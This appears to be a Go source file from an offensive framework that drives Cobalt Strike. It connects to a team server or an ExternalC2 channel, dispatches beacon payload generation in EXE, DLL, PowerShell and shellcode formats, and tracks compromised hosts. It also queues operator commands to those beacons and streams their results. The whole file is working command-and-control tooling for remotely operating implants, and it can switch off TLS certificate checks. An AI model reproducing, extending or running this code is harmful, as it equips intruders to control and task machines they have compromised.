package cobaltstrike

import (
	"crypto/tls"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"net/http"
	"strconv"
	"sync"
	"time"

	"github.com/ares/engine/internal/logger"
	"github.com/ares/engine/internal/uuid"
)

type CSConfig struct {
	TeamServerHost string `json:"teamserver_host"`
	Port           int    `json:"port"`
	User           string `json:"user"`
	Password       string `json:"password"`
	ExternalC2Host string `json:"externalc2_host"`
	ExternalC2Port int    `json:"externalc2_port"`
	SSLVerify      bool   `json:"ssl_verify"`
}

type CSBeacon struct {
	ID          string    `json:"id"`
	InternalIP  string    `json:"internal_ip"`
	ExternalIP  string    `json:"external_ip"`
	Computer    string    `json:"computer"`
	User        string    `json:"user"`
	Process     string    `json:"process"`
	PID         int       `json:"pid"`
	Arch        string    `json:"arch"`
	LastCheckin time.Time `json:"last_checkin"`
}

type CSTask struct {
	ID       string `json:"id"`
	BeaconID string `json:"beacon_id"`
	Command  string `json:"command"`
	Status   string `json:"status"`
	Result   string `json:"result"`
}

type CSExternalC2Listener struct {
	Name    string `json:"name"`
	Type    string `json:"type"`
	Port    int    `json:"port"`
	Payload string `json:"payload"`
}

type CobaltStrikeEngine struct {
	mu                sync.RWMutex
	config            CSConfig
	connected         bool
	httpClient        *http.Client
	beacons           map[string]*CSBeacon
	tasks             map[string]*CSTask
	externalC2Conn    net.Conn
	listeners         map[string]*CSExternalC2Listener
	restAPIEnabled    bool
}

func NewCobaltStrikeEngine(config CSConfig) *CobaltStrikeEngine {
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: !config.SSLVerify,
		},
	}
	return &CobaltStrikeEngine{
		config:     config,
		httpClient: &http.Client{Transport: tr, Timeout: 30 * time.Second},
		beacons:    make(map[string]*CSBeacon),
		tasks:      make(map[string]*CSTask),
		listeners:  make(map[string]*CSExternalC2Listener),
	}
}

func (e *CobaltStrikeEngine) Connect() error {
	e.mu.Lock()
	defer e.mu.Unlock()

	if e.config.ExternalC2Host != "" && e.config.ExternalC2Port > 0 {
		addr := net.JoinHostPort(e.config.ExternalC2Host, strconv.Itoa(e.config.ExternalC2Port))
		conn, err := net.DialTimeout("tcp", addr, 10*time.Second)
		if err != nil {
			return fmt.Errorf("externalc2 connect: %w", err)
		}
		e.externalC2Conn = conn
		e.connected = true
		logger.Info(fmt.Sprintf("[CobaltStrike] ExternalC2 connected to %s", addr))
		return nil
	}

	if e.config.TeamServerHost != "" && e.config.User != "" {
		url := fmt.Sprintf("https://%s:%d/api/cs/check", e.config.TeamServerHost, e.config.Port)
		req, _ := http.NewRequest("GET", url, nil)
		req.SetBasicAuth(e.config.User, e.config.Password)
		resp, err := e.httpClient.Do(req)
		if err != nil {
			return fmt.Errorf("rest api connect: %w", err)
		}
		defer resp.Body.Close()
		if resp.StatusCode == http.StatusOK {
			e.restAPIEnabled = true
			e.connected = true
			logger.Info(fmt.Sprintf("[CobaltStrike] REST API connected to %s", e.config.TeamServerHost))
			return nil
		}
		return fmt.Errorf("rest api auth failed: status %d", resp.StatusCode)
	}

	return fmt.Errorf("no connection method configured")
}

func (e *CobaltStrikeEngine) Disconnect() error {
	e.mu.Lock()
	defer e.mu.Unlock()

	if e.externalC2Conn != nil {
		e.externalC2Conn.Close()
		e.externalC2Conn = nil
	}
	e.connected = false
	e.restAPIEnabled = false
	logger.Info("[CobaltStrike] Disconnected")
	return nil
}

func (e *CobaltStrikeEngine) GenerateBeacon(arch string, format string, listenerName string) (string, error) {
	switch format {
	case "exe":
		return e.GenerateBeaconEXE(listenerName, arch)
	case "dll":
		return e.GenerateBeaconDLL(listenerName, arch)
	case "ps1", "powershell":
		return e.GenerateBeaconPowerShell(listenerName)
	case "shellcode", "raw":
		return e.GenerateBeaconShellcode(listenerName, arch, "raw")
	default:
		return "", fmt.Errorf("unsupported beacon format: %s", format)
	}
}

func (e *CobaltStrikeEngine) ListBeacons() []CSBeacon {
	e.mu.RLock()
	defer e.mu.RUnlock()
	result := make([]CSBeacon, 0, len(e.beacons))
	for _, b := range e.beacons {
		result = append(result, *b)
	}
	return result
}

func (e *CobaltStrikeEngine) SendTask(beaconID, command string) (*CSTask, error) {
	e.mu.Lock()
	defer e.mu.Unlock()

	if _, ok := e.beacons[beaconID]; !ok {
		return nil, fmt.Errorf("beacon %s not found", beaconID)
	}

	task := &CSTask{
		ID:       uuid.New(),
		BeaconID: beaconID,
		Command:  command,
		Status:   "pending",
	}
	e.tasks[task.ID] = task

	if e.externalC2Conn != nil {
		frame := buildCommandFrame(task.ID, command)
		_, err := e.externalC2Conn.Write(frame)
		if err != nil {
			task.Status = "failed"
			return nil, fmt.Errorf("send task via externalc2: %w", err)
		}
	}

	logger.Info(fmt.Sprintf("[CobaltStrike] Task %s sent to beacon %s: %s", task.ID, beaconID, command))
	return task, nil
}

func (e *CobaltStrikeEngine) GetTaskResult(taskID string) (string, error) {
	e.mu.RLock()
	defer e.mu.RUnlock()

	task, ok := e.tasks[taskID]
	if !ok {
		return "", fmt.Errorf("task %s not found", taskID)
	}
	if task.Status != "complete" && task.Status != "failed" {
		return "", fmt.Errorf("task %s still in status: %s", taskID, task.Status)
	}
	return task.Result, nil
}

func (e *CobaltStrikeEngine) InteractiveSession(beaconID string) (chan string, error) {
	e.mu.RLock()
	if _, ok := e.beacons[beaconID]; !ok {
		e.mu.RUnlock()
		return nil, fmt.Errorf("beacon %s not found", beaconID)
	}
	e.mu.RUnlock()

	ch := make(chan string, 100)
	go func() {
		defer close(ch)
		ticker := time.NewTicker(2 * time.Second)
		defer ticker.Stop()
		for range ticker.C {
			e.mu.RLock()
			var pendingTasks []*CSTask
			for _, t := range e.tasks {
				if t.BeaconID == beaconID && t.Status == "pending" {
					pendingTasks = append(pendingTasks, t)
				}
			}
			e.mu.RUnlock()

			for _, t := range pendingTasks {
				ch <- fmt.Sprintf("task %s: %s", t.ID, t.Command)
			}

			e.mu.Lock()
			for _, t := range e.tasks {
				if t.BeaconID == beaconID && t.Status == "complete" && t.Result != "" {
					ch <- fmt.Sprintf("result %s: %s", t.ID, t.Result)
					t.Result = ""
				}
			}
			e.mu.Unlock()
		}
	}()
	return ch, nil
}

func (e *CobaltStrikeEngine) ExecuteAggressorScript(scriptPath string) (string, error) {
	return e.ExecuteAggressorScriptFile(scriptPath)
}

func (e *CobaltStrikeEngine) restAPICall(method, endpoint string, body io.Reader) (string, error) {
	if !e.restAPIEnabled {
		return "", fmt.Errorf("REST API not available")
	}
	url := fmt.Sprintf("https://%s:%d%s", e.config.TeamServerHost, e.config.Port, endpoint)
	req, err := http.NewRequest(method, url, body)
	if err != nil {
		return "", fmt.Errorf("create request: %w", err)
	}
	req.SetBasicAuth(e.config.User, e.config.Password)
	req.Header.Set("Content-Type", "application/json")
	resp, err := e.httpClient.Do(req)
	if err != nil {
		return "", fmt.Errorf("api call: %w", err)
	}
	defer resp.Body.Close()
	data, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", fmt.Errorf("read response: %w", err)
	}
	return string(data), nil
}

func buildCommandFrame(taskID, command string) []byte {
	frame := map[string]string{
		"task_id": taskID,
		"command": command,
		"type":    "command",
	}
	data, _ := json.Marshal(frame)
	return data
}
